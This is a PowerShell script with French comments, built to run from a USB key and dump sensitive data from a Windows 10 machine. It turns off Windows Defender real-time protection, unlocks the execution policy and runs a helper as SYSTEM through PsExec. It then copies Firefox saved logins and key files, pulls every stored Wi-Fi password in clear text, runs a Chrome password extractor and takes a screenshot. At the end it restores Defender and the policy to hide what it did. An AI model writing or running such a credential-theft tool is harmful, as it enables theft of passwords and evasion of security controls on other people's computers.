## Dump des données sensibles d'un poste Windows 10
#

## ByPass sécurité Windows
## Désactivation de Windows Defender
Set-MpPreference -DisableRealtimeMonitoring 0
Set-MpPreference -DisableRealtimeMonitoring $true

## Execution policy Unrestricted
$GetExecPolicy = Get-ExecutionPolicy
Set-ExecutionPolicy Unrestricted

## Récupération de la lettre de la clé
$letter =  gwmi win32_diskdrive | ?{$_.interfacetype -eq "USB"} | %{gwmi -Query "ASSOCIATORS OF {Win32_DiskDrive.DeviceID=`"$($_.DeviceID.replace('\','\\'))`"} WHERE AssocClass = Win32_DiskDriveToDiskPartition"} |  %{gwmi -Query "ASSOCIATORS OF {Win32_DiskPartition.DeviceID=`"$($_.DeviceID)`"} WHERE AssocClass = Win32_LogicalDiskToPartition"} | %{$_.deviceid}

# Création des dossiers
cd $letter"\"
$hostn = HOSTNAME.EXE
mkdir $hostn
cd $hostn
mkdir Data-Admin
mkdir Data-User
mkdir Data-System
cd ..

# Extraction des données en tant que NT SYSTEM (nécessite d'être admin local):
.\PsExec.exe -accepteula -i -s powershell /c $letter\procdump.ps1
#.\PsExec.exe -accepteula -i -s regedit

# Copie des données en tant que simple utilisateur
# Dump des mots de passe Chrome et Firefox
whoami.exe
$t = dir env:\LOCALAPPDATA
$t.Value
cd $t.Value

# Dump Mozilla
$mozillas = Get-ChildItem -Path "..\Roaming\Mozilla\Firefox\Profiles"
cd $mozillas
foreach ($mozilla in $mozillas)
{
    cp .\$mozilla\logins.json $letter\$hostn\Data-Admin\$User
    cp .\$mozilla\key* $letter\$hostn\Data-Admin\$User
    cp .\$mozilla\cert* $letter\$hostn\Data-Admin\$User
}

cd $letter\$hostn\Data-User
# Dump des clés Wifi
$wifi1 = netsh wlan show profiles |Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} 
$wifi1 | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Contenu de la clé\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} 
$wifi1 | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize > $letter\$hostn\Data-User\Wifi-temp.txt
Type $letter\$hostn\Data-User\Wifi-temp.txt | Select -Unique > .\Wifi.txt
rm .\Wifi-temp.txt
#>

[Reflection.Assembly]::LoadWithPartialName("System.Drawing")
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing") 
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
function Get-ScreenCapture
{
    param(    
    [Switch]$OfWindow        
    )


    begin {
        Add-Type -AssemblyName System.Drawing
        $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | 
            Where-Object { $_.FormatDescription -eq "JPEG" }
    }
    process {
        Start-Sleep -Milliseconds 250
        if ($OfWindow) {            
            [Windows.Forms.Sendkeys]::SendWait("%{PrtSc}")        
        } else {
            [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")        
        }
        Start-Sleep -Milliseconds 250
        $bitmap = [Windows.Forms.Clipboard]::GetImage()    
        $ep = New-Object Drawing.Imaging.EncoderParameters  
        $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)  
        $screenCapturePathBase = "$pwd\ScreenCapture"
        $c = 0
        while (Test-Path "${screenCapturePathBase}${c}.jpg") {
            $c++
        }
        $bitmap.Save("${screenCapturePathBase}${c}.jpg", $jpegCodec, $ep)
    }
}

## Mdp chrome
cd $letter"\"
.\cp.exe
cd .\$hostn\Data-User
Start-Sleep -Seconds 5
Get-ScreenCapture


cd $letter"\"


## Réajustement de execution policy
Set-ExecutionPolicy $GetExecPolicy

## Réactivation de Windows Defender
Set-MpPreference -DisableRealtimeMonitoring 1
Set-MpPreference -DisableRealtimeMonitoring $false

Write-Host "Fin !"